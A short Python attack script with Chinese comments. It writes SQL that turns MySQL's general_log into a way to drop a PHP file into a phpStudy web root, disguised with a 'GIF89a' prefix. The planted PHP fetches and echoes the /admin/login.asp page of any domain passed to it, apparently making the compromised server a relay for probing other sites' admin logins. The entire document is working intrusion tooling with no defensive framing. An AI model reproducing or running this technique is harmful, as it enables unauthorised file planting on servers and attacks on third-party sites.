#!/usr/bin/env python3
"""gen_form_raw.py - 生成form_raw.php(81.70返回原始登录页HTML)
?d=域名 → PHP curl GET /admin/login.asp → 输出原始HTML(截断到8KB)
"""
body = '<?php $d=$_GET["d"];$ch=curl_init("http://".$d."/admin/login.asp");curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);curl_setopt($ch,CURLOPT_TIMEOUT,15);$r=curl_exec($ch);echo "LEN:".strlen($r)."|";echo substr($r,0,8000);?>'

assert "'" not in body.replace("php://input", "")
sql = []
sql.append("SET GLOBAL general_log=OFF;")
sql.append("SET GLOBAL general_log_file='C:/phpStudy/WWW/form_raw.php';")
sql.append("SET GLOBAL general_log=ON;")
sql.append("SELECT 'GIF89a%s//'" % body)
sql.append("SET GLOBAL general_log=OFF;")
with open('/tmp/form_raw.sql', 'w') as f:
    f.write('\n'.join(sql) + '\n')
print('ready, len:', len(body))
